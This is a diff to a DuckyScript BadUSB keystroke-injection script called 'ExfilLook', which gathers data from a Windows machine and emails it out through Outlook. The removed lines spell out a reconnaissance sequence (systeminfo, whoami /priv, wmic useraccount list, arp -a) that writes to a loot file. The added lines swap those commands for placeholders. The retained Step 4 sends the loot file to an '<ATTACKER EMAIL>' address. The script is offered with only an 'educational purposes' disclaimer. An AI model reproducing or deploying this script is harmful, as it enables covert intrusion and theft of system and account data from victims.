@@ -17,11 +17,9 @@ REM - [*] ExfilLook is a BadUSB exploit written in DuckyScript that enumerates d
 REM -------------------------- 
 
 REM - TOOL REQUIREMENTS
-REM - [*] Requires Outlook to be enabled on the target machine.
-REM - [*] Requires an internet connection.
-REM - [*] Requires the malicious email's email and password.
-REM - [*] Requires access to a terminal.
-REM - [*] Requires PowerShell to be able to run on the target Windows machine.
+REM - [*] Requires Outlook to be enabled on the target Windows machine.
+REM - [*] Requires an internet connection on the target Windows machine.
+REM - [*] Requires you to fill in the blanks in this script.
 
 REM - DISCLAIMERS
 REM - [*] This tool is made for educational purposes only and should only be tested on machines and systems that you have permission to test or personally own.
@@ -72,63 +70,21 @@ REM - Step 3: Enumerate the target data and redirect it to a text file
 REM -------------------------- 
 
 DELAY 2000
-STRING echo 'System information:' > FILENAME.txt
-DELAY 500
-ENTER
-DELAY 500
-STRING systeminfo >> FILENAME.txt
-DELAY 500 
-ENTER
-DELAY 500
-STRING echo '' >> FILENAME.txt
-DELAY 500
-ENTER
-DELAY 500
-STRING echo 'Current user information:' >> FILENAME.txt
-DELAY 500
-ENTER
-DELAY 700
-STRING echo '' >> FILENAME.txt
+STRING echo '<POWERSHELL COMMAND>' > FILENAME.txt
 DELAY 500
 ENTER
 
 DELAY 500
-STRING whoami >> FILENAME.txt
-DELAY 500
-ENTER
-DELAY 500
-STRING whoami /priv >> FILENAME.txt
-DELAY 500
-ENTER
-DELAY 500
-STRING echo '' >> FILENAME.txt
-DELAY 500
-ENTER
-DELAY 500
-STRING echo 'List of users:' >> FILENAME.txt
-DELAY 500
-ENTER
-DELAY 500
-STRING echo '' >> FILENAME.txt
-DELAY 500
-ENTER
-DELAY 500
-STRING wmic useraccount list >> FILENAME.txt
+STRING echo '<POWERSHELL COMMAND>' > FILENAME.txt
 DELAY 500
 ENTER
 
 DELAY 500
-STRING echo '' >> FILENAME.txt
+STRING echo '<POWERSHELL COMMAND>' > FILENAME.txt
 DELAY 500
 ENTER
-DELAY 500
-STRING echo 'Network addresses:' >> FILENAME.txt
-DELAY 500
-ENTER
-DELAY 500
-STRING arp -a >> FILENAME.txt
-DELAY 500
-ENTER
+
+REM - [...]
 REM -------------------------- 
 
 REM - Step 4: Exfiltrate the text file containing the loot using Outlook
@@ -155,10 +111,10 @@ STRING $email.To = "<ATTACKER EMAIL>"
 DELAY 500
 ENTER
 DELAY 500
-STRING $email.Subject = "SUBJECT"
+STRING $email.Subject = "<SUBJECT>"
 DELAY 500
 ENTER
-STRING $email.Body = "BODY"
+STRING $email.Body = "<BODY>"
 DELAY 500
 ENTER
 DELAY 500
